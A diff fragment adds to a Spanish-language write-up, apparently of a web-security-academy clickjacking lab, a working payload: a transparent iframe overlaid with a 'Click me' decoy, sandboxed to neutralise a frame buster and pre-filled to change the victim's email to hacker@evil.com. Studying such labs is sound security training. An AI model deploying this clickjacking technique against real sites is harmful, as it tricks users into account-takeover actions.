@@ -69,4 +69,31 @@ Cómo lo evitamos:
 - Esto neutraliza el frame buster y permite mostrar el contenido sin activar el reemplazo.
 
 
+Al igual que en el laboratorio anterior, accedemos al exploit server y procedemos a crean nuestra página maliciosa utilizando nuestro script:
+```javascript
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 385px;
+        left: 80px;
+        z-index: 1;
+        background: #fff;
+        padding: 10px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+</style>
+
+<div>Click me</div>
+<iframe sandbox="allow-forms"
+src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
+```
+
 
